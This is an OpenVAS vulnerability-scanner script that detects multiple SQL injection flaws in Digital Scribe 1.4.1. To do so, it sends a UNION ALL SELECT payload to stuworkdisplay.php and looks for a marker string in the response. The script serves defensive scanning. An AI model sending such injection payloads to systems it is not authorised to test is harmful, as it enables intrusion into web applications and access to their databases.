###############################################################################
# OpenVAS Vulnerability Test
# $Id: digital_scribe_37292.nasl 5253 2017-02-09 16:35:48Z mime $
#
# Digital Scribe Multiple SQL Injection Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Digital Scribe is prone to multiple SQL-injection vulnerabilities
because it fails to sufficiently sanitize user-supplied data before
using it in an SQL query.

Exploiting these issues could allow an attacker to compromise the
application, access or modify data, or exploit latent vulnerabilities
in the underlying database.

Digital Scribe 1.4.1 is vulnerable; other versions may also be
affected.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100398");
 script_version("$Revision: 5253 $");
 script_tag(name:"last_modification", value:"$Date: 2017-02-09 17:35:48 +0100 (Thu, 09 Feb 2017) $");
 script_tag(name:"creation_date", value:"2009-12-15 19:11:56 +0100 (Tue, 15 Dec 2009)");
 script_bugtraq_id(37292);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("Digital Scribe Multiple SQL Injection Vulnerabilities");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/37292");
 script_xref(name : "URL" , value : "http://www.digital-scribe.org/");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/508410");

 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

port = get_http_port(default:80);

dirs = make_list_unique("/", "/DigitalScribe","/digitalscribe", cgi_dirs( port:port ));

foreach dir (dirs) {

  if( dir == "/" ) dir = "";

  url = string(dir, "/stuworkdisplay.php?ID=-1)%20UNION%20ALL%20SELECT%200x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11%23"); 
  req = http_get(item:url, port:port);
  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if( buf == NULL || buf !~ "HTTP/1\.. 200" ) continue;

  if("Student Work" >< buf && "OpenVAS-SQL-Injection-Test" >< buf )  {

      report = report_vuln_url( port:port, url:url );

      security_message(port:port, data:report);
      exit(0);
  }
}

exit(0);